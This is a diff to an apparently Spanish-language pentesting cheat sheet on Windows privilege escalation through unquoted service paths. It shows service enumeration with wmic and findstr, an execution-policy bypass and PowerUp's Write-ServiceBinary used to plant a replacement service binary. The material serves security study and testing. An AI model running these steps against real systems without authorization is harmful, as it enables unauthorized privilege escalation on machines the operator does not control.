@@ -1686,7 +1686,6 @@ C:\Program Files\my example\my example\example.exe
 ```powershell
 # Buscamos servicios que cumplan con esta condición
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName
-wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
 
 # Comprobar si podemos iniciar/detener el servicio
 Start-Service <SERVICE>
@@ -1699,6 +1698,9 @@ icacls "C:\Program Files\my example"
 
 # Iniciamos el servicio
 Start-Service <SERVICE>
+
+# Otra forma de buscar binarios que cumplan con esta condición es
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
 
 ###### Alternativa - PowerUp
@@ -1707,7 +1709,7 @@ Start-Service <SERVICE>
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-UnquotedService
-Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my example\example.exe"
+Write-ServiceBinary -Name '<SERVICE>' -Path "C:\Program Files\my binary\binary.exe"
 Start-Service <SERVICE>
 ```
 
